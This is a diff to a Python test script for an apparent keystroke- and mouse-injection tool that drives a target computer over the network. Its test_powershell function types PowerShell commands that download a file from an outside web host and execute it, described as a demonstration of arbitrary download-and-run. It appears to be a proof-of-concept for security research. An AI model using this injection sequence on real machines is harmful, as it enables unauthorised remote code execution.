@@ -25,9 +25,11 @@ def main():
 
     r = driver(ip, UDP_PORT, TCP_PORT)
 
-    tests = [#test_test]
+    # tests = [test_test]
              # test_open_url,
-             test_powershell]
+             #test_powershell]
+
+    tests = [test_powershell]
 
     for run in tests:
         clean_environment(r)
@@ -35,17 +37,17 @@ def main():
         sleep(3)
 
 def clean_environment(r):
-    # pass
+    return None
     r.move_mouse(-2000, -2000)
 
 def test_test(r):
     print "Running test"
     # r.left_click()
     # r.right_click()
-    # r.scroll_up(5)
+    # r.scroll_up()
     # r.scroll_down()
     # sleep(0.2)
-    # r.type("abc")
+    r.type("abc")
     # r.move_mouse(5, 5)
 
 """
@@ -66,12 +68,12 @@ Demonstrates that we can download an arbitrary file from the Internet and
 execute it.
 """
 def test_powershell(r):
-    r.move_mouse(-2000,2000)
-    sleep(3)
+    # r.move_mouse(-2000,2000)
+    # sleep(4)
     r.left_click()
-    sleep(2.5)
+    # sleep(4.5)
     r.type('powershell\n')
-    sleep(4)
+    # sleep(4)
     r.type('$c = new-object System.Net.WebClient\n') \
      .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
      .type('.\\Desktop\\BackImage.jpg\n')
